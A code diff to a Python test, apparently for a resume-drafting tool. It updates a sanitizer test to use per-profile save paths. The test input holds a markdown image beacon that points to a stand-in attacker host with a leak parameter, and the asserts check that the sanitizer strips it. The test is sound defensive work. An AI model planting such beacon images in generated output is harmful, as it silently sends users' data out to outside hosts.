@@ -159,8 +159,8 @@ def test_save_markdown_sanitizes_all_writers(tmp_path, monkeypatch):
         "# Name\n\n![x](https://attacker.example/p?d=leak)\n\n"
         "Summary with an em dash — and a [link](https://tracker.example/c)."
     )
-    drafts.save_markdown(42, evil, None)
-    saved = (tmp_path / "42" / "resume.md").read_text(encoding="utf-8")
+    drafts.save_markdown(42, evil, None, profile_id=1)
+    saved = (tmp_path / "profile-1" / "42" / "resume.md").read_text(encoding="utf-8")
     assert "attacker.example" not in saved  # tracking image removed
     assert "—" not in saved  # char ban applied on the manual path too
     assert "](" not in saved  # link flattened to plain text
